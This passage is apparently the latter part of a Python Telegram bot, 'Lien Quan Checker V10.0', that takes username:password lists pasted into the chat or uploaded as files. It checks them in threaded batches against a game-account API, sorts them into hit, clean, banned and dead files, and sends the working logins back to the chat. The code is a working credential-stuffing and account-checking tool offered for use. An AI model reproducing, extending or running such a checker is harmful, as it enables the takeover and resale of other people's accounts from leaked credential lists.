            safe_send_message(chat_id, "ð« <b>ACC BI BAN - DA LOAI BO</b>")
            safe_send_message(chat_id,
                              f"ð« <b>BAN</b> | <code>{username}:{password}</code>")
        else:
            save_to_file(CLEAN_OUTPUT_FILE, username, password)
            safe_send_message(chat_id,
                              format_hit_info(username, password, service, r))
    elif rt == "dead":
        save_to_file(DEAD_OUTPUT_FILE, username, password)
        safe_send_message(chat_id,
                          f"â DEAD\nð <code>{username}:{password}</code>")
    else:
        save_to_file(ERROR_OUTPUT_FILE, username, password)
        safe_send_message(chat_id,
                          f"â ï¸ ERROR\nð <code>{username}:{password}</code>")


def check_batch(chat_id, accounts, service="lienquan"):
    global checking, stats

    if checking:
        safe_send_message(chat_id, "â ï¸ Dang check roi!")
        return

    checking = True
    stop_event.clear()
    api_cache.clear()
    clear_output_files()

    total = len(accounts)
    stats = {"total": total, "checked": 0, "hits": 0, "dead": 0,
             "errors": 0, "banned": 0, "clean": 0,
             "retries": 0, "cache_hits": 0, "removed": 0,
             "start_time": time.time()}

    icon = SERVICE_ROUTES.get(service, {}).get("icon", "ð")

    safe_send_message(chat_id, f"""
{icon} <b>CHECK LIEN QUAN V10.0</b>
ð Tong: <code>{total}</code> accounts
â¡ Threads: <code>{CHECKMULTI_THREADS}</code>
â± Delay: <code>{CHECKMULTI_DELAY}s</code>
ð¦ Batch: <code>{CHECKMULTI_BATCH_SIZE}</code>
ð Retry: <code>{DEFAULT_RETRIES}</code>
ð§¹ <b>AUTO LOAI BO ACC BAN</b>
ð¨ <b>GUI ACC CLEAN TRUC TIEP</b>
""")

    batches = [accounts[i:i + CHECKMULTI_BATCH_SIZE]
               for i in range(0, total, CHECKMULTI_BATCH_SIZE)]

    def process_one(user, pwd):
        if stop_event.is_set():
            return None

        rate_limit(CHECKMULTI_DELAY)

        r = check_account_api(user, pwd, service, use_delay=False,
                              max_retry=CHECKMULTI_MAX_RETRY)
        rt = r.get("result", "unknown")

        is_b = False
        reason = ""

        with stats_lock:
            stats["checked"] += 1
            if rt == "hit":
                stats["hits"] += 1
                is_b, reason = is_account_banned(r)
                if is_b:
                    stats["banned"] += 1
                    stats["removed"] += 1
                    save_to_file(BANNED_OUTPUT_FILE, user, pwd,
                                 f"{service}|{reason}")
                else:
                    stats["clean"] += 1
                    save_to_file(CLEAN_OUTPUT_FILE, user, pwd)
                save_to_file(HIT_OUTPUT_FILE, user, pwd, service)
            elif rt == "dead":
                stats["dead"] += 1
                save_to_file(DEAD_OUTPUT_FILE, user, pwd)
            else:
                stats["errors"] += 1
                save_to_file(ERROR_OUTPUT_FILE, user, pwd)

        return {
            "user": user,
            "pwd": pwd,
            "result": r,
            "type": rt,
            "is_banned": is_b,
            "reason": reason
        }

    for bn, batch in enumerate(batches, 1):
        if stop_event.is_set():
            break

        batch_results = []

        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as ex:
            futs = {ex.submit(process_one, u, p): (u, p) for u, p in batch}
            for f in as_completed(futs):
                if stop_event.is_set():
                    ex.shutdown(wait=False)
                    break
                try:
                    res = f.result(timeout=120)
                    if res:
                        batch_results.append(res)
                except Exception as e:
                    print(f"[!] worker loi: {e}")

        for item in batch_results:
            try:
                if item["type"] != "hit":
                    continue
                if item["is_banned"]:
                    safe_send_message(
                        chat_id,
                        f"ð« <b>BAN</b> | <code>{item['user']}:{item['pwd']}</code>"
                    )
                else:
                    safe_send_message(
                        chat_id,
                        format_hit_info(item["user"], item["pwd"],
                                        service, item["result"])
                    )
                time.sleep(0.25)
            except Exception as e:
                print(f"[!] Send hit loi: {e}")

        elapsed = time.time() - stats["start_time"]
        spd = stats["checked"] / elapsed if elapsed > 0 else 0
        pct = (stats["checked"] / total) * 100
        eta = (total - stats["checked"]) / spd if spd > 0 else 0
        eta_str = time.strftime("%M:%S", time.gmtime(eta)) if eta < 3600 else ">1h"

        safe_send_message(chat_id, f"""
ð¦ <b>BATCH {bn}/{len(batches)}</b> - {pct:.1f}%
â Hits: <code>{stats['hits']}</code>
ð¢ Clean: <code>{stats['clean']}</code>
ð« Banned: <code>{stats['banned']}</code>
â Dead: <code>{stats['dead']}</code>
â ï¸ Errors: <code>{stats['errors']}</code>
â¡ <code>{spd:.1f}</code> acc/s | â± ETA <code>{eta_str}</code>
""")

        if bn < len(batches):
            time.sleep(CHECKMULTI_BATCH_DELAY)

    checking = False
    elapsed = time.time() - stats["start_time"]
    spd = stats["checked"] / elapsed if elapsed > 0 else 0

    if chat_id in all_queued_accounts:
        all_queued_accounts[chat_id] = []

    safe_send_message(chat_id, f"""
â <b>CHECK HOAN TAT!</b>
ââââââââââââââââââââ
ð Tong: <code>{stats['total']}</code>
ð¯ HIT: <code>{stats['hits']}</code>
ð¢ Clean: <code>{stats['clean']}</code>
ð« Banned: <code>{stats['banned']}</code>
ð§¹ Da loai bo: <code>{stats['removed']}</code>
â DEAD: <code>{stats['dead']}</code>
â ï¸ ERROR: <code>{stats['errors']}</code>
ð Retries: <code>{stats['retries']}</code>
ð¾ Cache: <code>{stats['cache_hits']}</code>
â± Time: <code>{elapsed:.1f}s</code>
â¡ Speed: <code>{spd:.1f}</code> acc/s
ââââââââââââââââââââ
ð <code>{CLEAN_OUTPUT_FILE}</code>
ð <code>{BANNED_OUTPUT_FILE}</code>
""")

    if stats["clean"] > 0 and os.path.exists(CLEAN_OUTPUT_FILE):
        try:
            with open(CLEAN_OUTPUT_FILE, 'rb') as f:
                bot.send_document(
                    chat_id, f,
                    caption=f"ð¢ <b>TAT CA ACC CLEAN</b>\n"
                            f"ð So luong: <code>{stats['clean']}</code>",
                    parse_mode="HTML"
                )
        except Exception as e:
            print(f"[!] Gui file clean loi: {e}")


# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not check_membership(message):
        return
    safe_send_message(message.chat.id, f"""
ð® <b>LIEN QUAN CHECKER V10.0</b>
ð¤ Admin: @{ADMIN_USERNAME}

ð§¹ <b>Tá»° Äá»NG LOáº I Bá» ACC BAN</b>
ð¨ <b>Gá»¬I ACC CLEAN TRá»°C TIáº¾P</b>

ð <b>LENH:</b>
/check user:pass - Check 1 acc
/checkmulti u1:p1,u2:p2 - Check nhieu
/checkall - Check tat ca
/queue - Xem acc dang cho
/bannedstats - Thong ke
/clearbanned - Xoa file (admin)
/upaudio - Upload audio (admin)
/delaudio - Xoa audio (admin)
/stop - Dung check
""")


@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not check_membership(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, "â /check user:pass")
        return
    acc_input = parts[1].replace('|', ':')
    accounts, _ = loc_tk_mk_only(acc_input)
    if not accounts:
        safe_send_message(message.chat.id, "â Format sai!")
        return
    u, p = accounts[0]
    threading.Thread(target=check_single,
                     args=(message.chat.id, u, p, "lienquan"),
                     daemon=True).start()


@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(message):
    if not check_membership(message):
        return
    text = message.text.strip()
    if text.startswith('/checkmulti'):
        text = text[len('/checkmulti'):].strip()
    if not text:
        safe_send_message(message.chat.id,
                          "â /checkmulti user1:pass1\\nuser2:pass2")
        return
    acc_input = text.replace(',', '\n').replace('|', ':')
    accounts, _ = loc_tk_mk_only(acc_input)
    if not accounts:
        safe_send_message(message.chat.id, "â Khong tim thay acc!")
        return
    safe_send_message(message.chat.id,
                      f"ð Check {len(accounts)} accounts...")
    threading.Thread(target=check_batch,
                     args=(message.chat.id, accounts, "lienquan"),
                     daemon=True).start()


@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    if not check_membership(message):
        return
    cid = message.chat.id
    if checking:
        safe_send_message(cid, "â ï¸ Dang check roi! Doi hoac /stop.")
        return

    accs = []
    if cid in pending_accounts and pending_accounts[cid]:
        accs = list(pending_accounts[cid])
    elif cid in all_queued_accounts and all_queued_accounts[cid]:
        accs = list(all_queued_accounts[cid])
    else:
        accs = load_queued_accounts(cid)

    if not accs:
        safe_send_message(cid,
                          "â Khong co acc nao! Gui file .txt hoac paste truoc.")
        return

    safe_send_message(cid,
                      f"ð Tu dong check {len(accs)} accounts, loai bo acc bi ban...")
    threading.Thread(target=check_batch,
                     args=(cid, accs, "lienquan"),
                     daemon=True).start()


@bot.message_handler(commands=['queue'])
def cmd_queue(message):
    if not check_membership(message):
        return
    cid = message.chat.id
    accs = pending_accounts.get(cid) or all_queued_accounts.get(cid) or []
    safe_send_message(cid,
                      f"ð Dang cho: <code>{len(accs)}</code> accounts\n"
                      f"Gui /checkall de bat dau.")


@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not check_membership(message):
        return
    stop_event.set()
    global checking
    checking = False
    safe_send_message(message.chat.id, "ð Da dung check!")


@bot.message_handler(commands=['bannedstats'])
def cmd_bannedstats(message):
    if not check_membership(message):
        return
    counts = {}
    for fn in [CLEAN_OUTPUT_FILE, BANNED_OUTPUT_FILE, HIT_OUTPUT_FILE,
               DEAD_OUTPUT_FILE, ERROR_OUTPUT_FILE]:
        c = 0
        if os.path.exists(fn):
            with open(fn, 'r', encoding='utf-8') as f:
                c = sum(1 for _ in f)
        counts[fn] = c
    safe_send_message(message.chat.id, f"""
ð <b>THONG KE FILE</b>
ð¢ Clean: <code>{counts[CLEAN_OUTPUT_FILE]}</code>
ð« Banned: <code>{counts[BANNED_OUTPUT_FILE]}</code>
ð¯ Hits: <code>{counts[HIT_OUTPUT_FILE]}</code>
â Dead: <code>{counts[DEAD_OUTPUT_FILE]}</code>
â ï¸ Error: <code>{counts[ERROR_OUTPUT_FILE]}</code>
""")


@bot.message_handler(commands=['clearbanned'])
def cmd_clearbanned(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "â Khong co quyen!")
        return
    clear_output_files()
    safe_send_message(message.chat.id, "â Da xoa tat ca file output!")


@bot.message_handler(commands=['upaudio'])
def cmd_upaudio(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "â Khong co quyen!")
        return
    safe_send_message(message.chat.id, "ðµ Gui file .wav hoac .mp3.")


@bot.message_handler(commands=['delaudio'])
def cmd_delaudio(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "â Khong co quyen!")
        return
    global CUSTOM_AUDIO_DATA
    with AUDIO_LOCK:
        CUSTOM_AUDIO_DATA = None
    try:
        if os.path.exists(CUSTOM_AUDIO_PATH):
            os.remove(CUSTOM_AUDIO_PATH)
    except:
        pass
    safe_send_message(message.chat.id, "â Da xoa audio custom!")


@bot.message_handler(content_types=['audio'])
def handle_audio(message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        safe_send_message(message.chat.id, "â Khong co quyen!")
        return
    global CUSTOM_AUDIO_DATA
    try:
        fi = bot.get_file(message.audio.file_id)
        ad = bot.download_file(fi.file_path)
        if not ad:
            safe_send_message(message.chat.id, "â Khong the tai!")
            return
        if len(ad) > 20 * 1024 * 1024:
            safe_send_message(message.chat.id, "â File qua lon! Max 20MB.")
            return
        with AUDIO_LOCK:
            CUSTOM_AUDIO_DATA = ad
        with open(CUSTOM_AUDIO_PATH, 'wb') as f:
            f.write(ad)
        safe_send_message(message.chat.id,
                          f"â UPLOAD AUDIO OK! {len(ad)/(1024*1024):.2f} MB")
    except Exception as e:
        safe_send_message(message.chat.id, f"â Loi: {e}")


@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not check_membership(message):
        return
    global pending_accounts
    text = message.text.strip()
    cid = message.chat.id
    if text.startswith('/'):
        return
    accounts, _ = loc_tk_mk_only(text.replace('|', ':'))
    if not accounts:
        return
    pending_accounts[cid] = accounts
    all_queued_accounts[cid] = list(accounts)
    save_loc_file(accounts)
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    safe_send_message(cid, f"""
ð LOC {len(accounts)} ACCOUNTS
Preview:
{preview}

ð /checkall - Check tat ca (tu dong loai bo ban)
""")


@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not check_membership(message):
        return
    global pending_accounts, CUSTOM_AUDIO_DATA
    cid = message.chat.id
    try:
        fn = message.document.file_name or ""
        if str(message.from_user.id) == ADMIN_CHAT_ID and \
                (fn.endswith('.wav') or fn.endswith('.mp3')):
            fi = bot.get_file(message.document.file_id)
            ad = bot.download_file(fi.file_path)
            if not ad:
                safe_send_message(cid, "â Khong the tai audio!")
                return
            if len(ad) > 20 * 1024 * 1024:
                safe_send_message(cid, "â File qua lon! Max 20MB.")
                return
            with AUDIO_LOCK:
                CUSTOM_AUDIO_DATA = ad
            with open(CUSTOM_AUDIO_PATH, 'wb') as f:
                f.write(ad)
            safe_send_message(cid,
                              f"â UPLOAD AUDIO OK! {len(ad)/(1024*1024):.2f} MB")
            return
        if not fn.endswith('.txt'):
            safe_send_message(cid, "â Chi ho tro .txt!")
            return
        fi = bot.get_file(message.document.file_id)
        content = bot.download_file(fi.file_path).decode('utf-8', errors='ignore')
        accounts, _ = loc_tk_mk_only(content.replace('|', ':'))
        if not accounts:
            safe_send_message(cid, "â Khong tim thay user:pass!")
            return
        pending_accounts[cid] = accounts
        all_queued_accounts[cid] = list(accounts)
        save_loc_file(accounts)
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        safe_send_message(cid, f"""
â LOC {len(accounts)} ACCOUNTS
Preview:
{preview}

ð /checkall - Check tat ca (tu dong loai bo ban)
""")
    except Exception as e:
        safe_send_message(cid, f"â Loi: {e}")


def main():
    print("=" * 60)
    print("    LIEN QUAN CHECKER V10.0 - FULL")
    print("    ADMIN: @baohuyno1")
    print("    API: purchase.nhatminh301.com")
    print("    AUTO FILTER BAN + GUI CLEAN TRUC TIEP")
    print("=" * 60)

    try:
        if os.path.exists(OUTPUT_LOC):
            with open(OUTPUT_LOC, 'r', encoding='utf-8') as f:
                c = f.read()
            a, _ = loc_tk_mk_only(c.replace('|', ':'))
            if a:
                all_queued_accounts["default"] = a
                print(f"[*] Khoi phuc {len(a)} acc tu file")
    except Exception as e:
        print(f"[!] Loi load file: {e}")

    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
